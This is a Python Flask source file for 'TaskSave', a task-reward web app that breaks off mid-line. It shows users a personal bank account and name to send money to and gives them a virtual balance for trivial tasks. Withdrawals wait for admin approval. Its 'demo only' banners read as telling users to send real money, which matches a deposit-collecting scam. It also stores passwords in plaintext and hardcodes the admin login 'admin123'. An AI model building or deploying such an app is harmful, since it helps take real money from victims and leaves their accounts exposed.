from flask import Flask, request, redirect, url_for, session, render_template_string, send_file
from flask_sqlalchemy import SQLAlchemy
from werkzeug.utils import secure_filename
from datetime import datetime
import os

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "change-this-demo-secret")

# Database
app.config["SQLALCHEMY_DATABASE_URI"] = "sqlite:///tasksave.db"
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
db = SQLAlchemy(app)

UPLOAD_FOLDER = "receipts"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
app.config["UPLOAD_FOLDER"] = UPLOAD_FOLDER

# DEMO PAYMENT DETAILS ONLY
DEMO_BANK = "Opay Bank"
DEMO_ACCOUNT_NUMBER = "9059426017"
DEMO_ACCOUNT_NAME = "Babatunde rashidat opeyemi"

ADMIN_USERNAME = "admin"
ADMIN_PASSWORD = "admin123"


# ---------------- DATABASE MODELS ----------------

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password = db.Column(db.String(200), nullable=False)
    balance = db.Column(db.Float, default=3000)


class Payment(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), nullable=False)
    amount = db.Column(db.Float, nullable=False)
    receipt = db.Column(db.String(300), nullable=False)
    status = db.Column(db.String(30), default="PENDING")
    reason = db.Column(db.String(300), default="")
    date = db.Column(db.DateTime, default=datetime.utcnow)


class Withdrawal(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), nullable=False)
    amount = db.Column(db.Float, nullable=False)
    bank_name = db.Column(db.String(100), nullable=False)
    account_number = db.Column(db.String(50), nullable=False)
    account_name = db.Column(db.String(100), nullable=False)
    status = db.Column(db.String(30), default="PENDING")
    reason = db.Column(db.String(300), default="")
    date = db.Column(db.DateTime, default=datetime.utcnow)


with app.app_context():
    db.create_all()


TASKS = [
    {
        "id": 1,
        "title": "Task 1",
        "description": "Read today's learning tip.",
        "reward": 100
    },
    {
        "id": 2,
        "title": "Task 2",
        "description": "Answer a practice question.",
        "reward": 100
    },
    {
        "id": 3,
        "title": "Task 3",
        "description": "Check your progress.",
        "reward": 100
    }
]


# ---------------- PAGE ----------------

PAGE = """
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">

<title>TaskSave Demo</title>

<style>

body {
    font-family: Arial, sans-serif;
    background: #f2f5f9;
    margin: 0;
    padding: 20px;
}

.card {
    max-width: 600px;
    margin: 25px auto;
    background: white;
    padding: 25px;
    border-radius: 18px;
    box-shadow: 0 4px 15px #0002;
}

h1 {
    text-align: center;
}

input {
    width: 100%;
    box-sizing: border-box;
    padding: 13px;
    margin: 7px 0;
    border: 1px solid #ddd;
    border-radius: 9px;
    font-size: 15px;
}

button {
    width: 100%;
    padding: 13px;
    margin-top: 8px;
    border: 0;
    border-radius: 9px;
    background: #2563eb;
    color: white;
    font-size: 16px;
}

.success {
    background: #16a34a;
}

.danger {
    background: #dc2626;
}

.box {
    background: #f2f5f9;
    padding: 15px;
    border-radius: 12px;
    margin: 15px 0;
}

.balance {
    font-size: 34px;
    font-weight: bold;
    text-align: center;
}

.status {
    padding: 9px;
    border-radius: 8px;
    font-weight: bold;
    text-align: center;
}

.pending {
    background: #fff3cd;
}

.verified,
.approved {
    background: #d1fae5;
}

.rejected {
    background: #fee2e2;
}

.error {
    color: #c00;
}

.small {
    text-align: center;
    color: #777;
    font-size: 13px;
}

a {
    color: #2563eb;
}

.warning {
    background: #fff7ed;
    padding: 12px;
    border-radius: 10px;
    font-size: 13px;
}

</style>
</head>

<body>

<div class="card">

{% if page == "login" %}

<h1>TaskSave 💰</h1>

<p class="small">
DEMO ONLY —  real money only.
</p>

{% if error %}
<p class="error">{{ error }}</p>
{% endif %}

<form method="POST">

<input
name="username"
placeholder="Username"
required
>

<input
type="password"
name="password"
placeholder="Password"
required
>

<button>
Login
</button>

</form>

<p style="text-align:center">
<a href="/register">
Create demo account
</a>
</p>


{% elif page == "register" %}

<h1>Create Demo Account</h1>

<p class="small">
DEMO ONLY —  real money only .
</p>

{% if error %}
<p class="error">{{ error }}</p>
{% endif %}

<form method="POST">

<input
name="username"
placeholder="Choose username"
required
>

<input
type="password"
name="password"
placeholder="Choose password"
required
>

<button>
Create Account
</button>

</form>

<p style="text-align:center">
<a href="/login">
Back to login
</a>
</p>


{% elif page == "dashboard" %}

<h1>TaskSave 💰</h1>

<p>
Welcome, <b>{{ username }}</b> 👋
</p>

<div class="box">

<p>Virtual balance</p>

<div class="balance">
₦{{ "%.2f"|format(balance) }}
</div>

</div>


<h2>Demo Payment</h2>

<div class="box">

<b>Payment details</b>

<p>
Bank: {{ bank }}
</p>

<p>
Account Number: {{ account }}
</p>

<p>
Account Name: {{ account_name }}
</p>

</div>

<div class="warning">
DEMO ONLY.  send real money using these details.
</div>


<form
method="POST"
action="/submit-payment"
enctype="multipart/form-data"
>

<input
type="number"
name="amount"
min="1"
step="0.01"
placeholder="Demo amount"
required
>

<input
type="file"
name="receipt"
accept="image/*"
required
>

<button>
Submit Receipt for Review
</button>

</form>


<h2>My Payments</h2>

{% for p in payments %}

<div class="box">

<b>
₦{{ "%.2f"|format(p.amount) }}
</b>

<p>
{{ p.date.strftime("%Y-%m-%d %H:%M") }}
</p>

<div class="status
{% if p.status == 'PENDING' %}
pending
{% elif p.status == 'VERIFIED' %}
verified
{% else %}
rejected
{% endif %}
">

{{ p.status }}

</div>

{% if p.reason %}
<p>
Reason: {{ p.reason }}
</p>
{% endif %}

</div>

{% else %}

<p>
No payment submissions yet.
</p>

{% endfor %}


<hr>


<h2>Withdraw Virtual Balance 💸</h2>

<p class="small">
Demo withdrawal only.  real bank transfer .
</p>

<form
method="POST"
action="/withdraw"
>

<input
type="number"
name="amount"
min="1"
step="0.01"
placeholder="Withdrawal amount"
required
>

<input
name="bank_name"
placeholder="Bank name"
required
>

<input
name="account_number"
placeholder="Account number"
required
>

<input
name="account_name"
placeholder="Account name"
required
>

<button>
Request Withdrawal
</button>

</form>


<h2>My Withdrawals</h2>

{% for w in withdrawals %}

<div class="box">

<b>
₦{{ "%.2f"|format(w.amount) }}
</b>

<p>
Bank: {{ w.bank_name }}
</p>

<p>
Account: {{ w.account_number }}
</p>

<p>
Name: {{ w.account_name }}
</p>

<p>
{{ w.date.strftime("%Y-%m-%d %H:%M") }}
</p>

<div class="status
{% if w.status == 'PENDING' %}
pending
{% elif w.status == 'APPROVED' %}
approved
{% else %}
rejected
{% endif %}
">

{{ w.status }}

</div>

{% if w.reason %}
<p>
Reason: {{ w.reason }}
</p>
{% endif %}

</div>

{% else %}

<p>
No withdrawal requests yet.
</p>

{% endfor %}


<hr>


<h2>Tasks 📋</h2>

{% for task in tasks %}

<div class="box">

<h3>
{{ task.title }}
</h3>

<p>
{{ task.description }}
</p>

{% if task.id in completed %}

<div class="status verified">
Completed ✅ +₦{{ task.reward }}
</div>

{% else %}

<form
method="POST"
action="/complete-task/{{ task.id }}"
>

<button>
Complete Task
</button>

</form>

{% endif %}

</div>

{% endfor %}


<p style="text-align:center">

<a href="/logout">
Logout
</a>

</p>


{% elif page == "admin_login" %}

<h1>Admin Login 🔐</h1>

{% if error %}
<p class="error">
{{ error }}
</p>
{% endif %}

<form method="POST">

<input
name="username"
placeholder="Admin username"
required
>

<input
type="password"
name="password"
placeholder="Admin password"
required
>

<button>
Admin Login
</button>

</form>


{% elif page == "admin" %}

<h1>Admin Dashboard 🔐</h1>

<p class="small">
DEMO ADMIN AREA
</p>


<h2>Payment Submissions</h2>

{% for p in payments %}

<div class="box">

<h3>
Payment #{{ p.id }}
</h3>

<p>
User: <b>{{ p.username }}</b>
</p>

<p>
Amount: <b>₦{{ "%.2f"|format(p.amount) }}</b>
</p>

<p>
Date: {{ p.date.strftime("%Y-%m-%d %H:%M") }}
</p>

<div class="status
{% if p.status == 'PENDING' %}
pending
{% elif p.status == 'VERIFIED' %}
verified
{% else %}
rejected
{% endif %}
">

{{ p.status }}

</div>

<p>
<a
href="/receipt/{{ p.id }}"
target="_blank"
>
View receipt
</a>
</p>

{% if p.status == "PENDING" %}

<form
method="POST"
action="/verify/{{ p.id }}"
>

<button class="success">
Verify Payment
</button>

</form>

<form
method="POST"
action="/reject/{{ p.id }}"
>

<button class="danger">
Reject Payment
</button>

</form>

{% endif %}

</div>

{% else %}

<p>
No payment submissions.
</p>

{% endfor %}


<hr>


<h2>Withdrawal Requests 💸</h2>

{% for w in withdrawals %}

<div class="box">

<h3>
Withdrawal #{{ w.id }}
</h3>

<p>
User: <b>{{ w.username }}</b>
</p>

<p>
Amount:
<b>
₦{{ "%.2f"|format(w.amount) }}
</b>
</p>

<p>
Bank: {{ w.bank_name }}
</p>

<p>
Account: {{ w.account_number }}
</p>

<p>
Name: {{ w.account_name }}
</p>

<p>
Date: {{ w.date.strftime("%Y-%m-%d %H:%M") }}
</p>

<div class="status
{% if w.status == 'PENDING' %}
pending
{% elif w.status == 'APPROVED' %}
approved
{% else %}
rejected
{% endif %}
">

{{ w.status }}

</div>


{% if w.status == "PENDING" %}

<form
method="POST"
action="/approve-withdrawal/{{ w.id }}"
>

<button class="success">
Approve Withdrawal
</button>

</form>

<form
method="POST"
action="/reject-withdrawal/{{ w.id }}"
>

<button class="danger">
Reject Withdrawal
</button>

</form>

{% endif %}

</div>

{% else %}

<p>
No withdrawal requests.
</p>

{% endfor %}


<p style="text-align:center">

<a href="/admin/logout">
Admin Logout
</a>

</p>

{% endif %}

</div>

</body>
</html>
"""


# ---------------- USER AUTH ----------------

@app.route("/")
def home():

    if "username" in session:
        return redirect(url_for("dashboard"))

    return redirect(url_for("login"))


@app.route("/register", methods=["GET", "POST"])
def register():

    if request.method == "POST":

        username = request.form.get("username", "").strip()
        password = request.form.get("password", "")

        existing = User.query.filter_by(
            username=username
        ).first()

        if existing:

            return render_template_string(
                PAGE,
                page="register",
                error="Username already exists."
            )

        if len(username) < 3 or len(password) < 4:

            return render_template_string(
                PAGE,
                page="register",
                error="Username must be 3+ characters and password 4+ characters."
            )

        user = User(
            username=username,
            password=password,
            balance=3000
        )

        db.session.add(user)
        db.session.commit()

        session["username"] = username

        return redirect(url_for("dashboard"))

    return render_template_string(
        PAGE,
        page="register",
        error=""
    )


@app.route("/login", methods=["GET", "POST"])
def login():

    if request.method == "POST":

        username = request.form.get("username", "").strip()
        password = request.form.get("password", "")

        user = User.query.filter_by(
            username=username
        ).first()

        if user and user.password == password:

            session["username"] = username

            return redirect(url_for("dashboard"))

        return render_template_string(
            PAGE,
            page="login",
            error="Incorrect username or password."
        )

    return render_template_string(
        PAGE,
        page="login",
        error=""
    )


# ---------------- USER DASHBOARD ----------------

@app.route("/dashboard")
def dashboard():

    username = session.get("username")

    if not username:
        return redirect(url_for("login"))

    user = User.query.filter_by(
        username=username
    ).first()

    if not user:
        session.clear()
        return redirect(url_for("login"))

    payments = Payment.query.filter_by(
        username=username
    ).order_by(Payment.id.desc()).all()

    withdrawals = Withdrawal.query.filter_by(
        username=username
    ).order_by(Withdrawal.id.desc()).all()

    # For this demo, completed tasks are stored in session.
    completed = session.get("completed_tasks", [])

    return render_template_string(
        PAGE,
        page="dashboard",
        username=username,
        balance=user.balance,
        payments=payments,
        withdrawals=withdrawals,
        tasks=TASKS,
        completed=completed,
        bank=DEMO_BANK,
        account=DEMO_ACCOUNT_NUMBER,
        account_name=DEMO_ACCOUNT_NAME
    )


# ---------------- PAYMENTS ----------------

@app.route("/submit-payment", methods=["POST"])
def submit_payment():

    username = session.get("username")

    if not username:
        return redirect(url_for("login"))

    amount = request.form.get("amount")
    receipt = request.files.get("receipt")

    try:
        amount = float(amount)
    except (TypeError, ValueError):
        return redirect(url_for("dashboard"))

    if amount <= 0 or not receipt:
        return redirect(url_for("dashboard"))

    filename = secure_filename(receipt.filename)

    if not filename:
        return redirect(url_for("dashboard"))

    filename = f"{datetime.utcnow().timestamp()}_{filename}"

    filepath = os.path.join(
        app.config["UPLOAD_FOLDER"],
        filename
    )

    receipt.save(filepath)

    payment = Payment(
        username=username,
        amount=amount,
        receipt=filename,
        status="PENDING"
    )

    db.session.add(payment)
    db.session.commit()

    return redirect(url_for("dashboard"))


@app.route("/receipt/<int:payment_id>")
def receipt(payment_id):

    if not session.get("admin"):
        return "Unauthorized", 403

    payment = db.session.get(
        Payment,
        payment_id
    )

    if not payment:
        return "Receipt not found", 404

    filepath = os.path.join(
        app.config["UPLOAD_FOLDER"],
        payment.receipt
    )

    if not os.path.exists(filepath):
        return "Receipt file not found", 404

    return send_file(filepath)


@app.route("/verify/<int:payment_id>", methods=["POST"])
def verify(payment_id):

    if not session.get("admin"):
        return redirect(url_for("admin_login"))

    payment = db.session.get(
        Payment,
        payment_id
    )

    if payment and payment.status == "PENDING":

        payment.status = "VERIFIED"

        user = User.query.filter_by(
            username=payment.username
        ).first()

        if user:
            user.balance += payment.amount

        db.session.commit()

    return redirect(url_for("admin_dashboard"))


@app.route("/reject/<int:payment_id>", methods=["POST"])
def reject(payment_id):

    if not session.get("admin"):
        return redirect(url_for("admin_login"))

    payment = db.session.get(
        Payment,
        payment_id
    )

    if payment and payment.status == "PENDING":

        payment.status = "REJECTED"
        payment.reason = "Receipt could not be verified."

        db.session.commit()

    return redirect(url_for("admin_dashboard"))


# ---------------- WITHDRAWALS ----------------

@app.route("/withdraw", methods=["POST"])
def withdraw():

    username = session.get("username")

    if not username:
        return redirect(url_for("login"))

    user = User.query.filter_by(
        username=username
    ).first()

    if not user:
        return redirect(url_for("login"))

    try:
        amount = float(
            request.form.get("amount", "0")
        )
    except ValueError:
        return redirect(url_for("dashboard"))

    bank_name = request.form.get(
        "bank_name", ""
    ).strip()

    account_number = request.form.get(
        "account_number", ""
    ).strip()

    account_name = request.form.get(
        "account_name", ""
    ).strip()

    if amount <= 0:
        return redirect(url_for("dashboard"))

    if amount > user.balance:
        return redirect(url_for("dashboard"))

    if not bank_name or not account_number or not account_name:
        return redirect(url_for("dashboard"))

    # Reserve the virtual amount.
    user.balance -= amount

    withdrawal = Withdrawal(
        username=username,
        amount=amount,
        bank_name=bank_name,
        account_number=account_number,
        account_name=account_name,
        status="PENDING"
    )

    db.session.add(withdrawal)
    db.session.commit()

    return redirect(url_for("dashboard"))


@app.route(
    "/approve-withdrawal/<int:withdrawal_id>",
    methods=["POST"]
)
def approve_withdrawal(withdrawal_id):

    if not session.get("admin"):
        return redirect(url_for("admin_login"))

    withdrawal = db.session.get(
        Withdrawal,
        withdrawal_id
    )

    if withdrawal and withdrawal.status == "PENDING":

        withdrawal.status = "APPROVED"

        db.session.commit()

    return redirect(url_for("admin_dashboard"))


@app.route(
    "/reject-withdrawal/<int:withdrawal_id>",
    methods=["POST"]
)
def reject_withdrawal(withdrawal_id):

    if not session.get("admin"):
        return redirect(url_for("admin_login"))

    withdrawal = db.session.get(
        Withdrawal,
        withdrawal_id
    )

    if withdrawal and withdrawal.status == "PENDING":

        withdrawal.status = "REJECTED"
        withdrawal.reason = "Withdrawal request rejected."

        # Return the reserved virtual balance.
        user = User.query.filter_by(
            username=withdrawal.username
        ).first()

        if user:
            user.balance += withdrawal.amount

        db.session.commit()

    return redirect(url_for("admin_dashboard"))


# ---------------- TASKS ----------------

@app.route(
    "/complete-task/<int:task_id>",
    methods=["POST"]
)
def complete_task(task_id):

    username = session.get("username")

    if not username:
        return redirect(url_for("login"))

    task = next(
        (t for t in TASKS if t["id"] == task_id),
        None
    )

    if not task:
        return redirect(url_for("dashboard"))

    completed = session.get(
        "completed_tasks",
        []
    )

    if task_id not in completed:

        user = User.query.filter_by(
            username=username
        ).first()

        if user:

            user.balance += task["reward"]

            completed.append(task_id)

            session["completed_tasks"] = completed

            db.session.commit()

    return redirect(url_for("dashboard"))


# ---------------- ADMIN ----------------

@app.route("/admin", methods=["GET", "POST"])
def admin_login():

    if session.get("admin"):
        return redirect(url_for("admin_dashboard"))

    error = ""

    if request.method == "POST":

        username = request.form.get("username")
        password = request.form.get("password")

        if (
            username == ADMIN_USERNAME
            and password == ADMIN_PASSWORD
        ):

            session["admin"] = True

            return redirect(url_for("admin_dashboard"))

        error = "Incorrect admin username or password."

    return render_template_string(
        PAGE,
        page="admin_login",
        error=error
    )


@app.route("/admin/dashboard")
def admin_dashboard():

    if not session.get("admin"):
        return redirect(url_for("admin_login"))

    payments = Payment.query.order_by(
        Payment.id.desc()
    ).all()

    withdrawals = Withdrawal.query.order_by(
        Withdrawal.id.desc()
    ).all()

    return render_template_string(
        PAGE,
        page="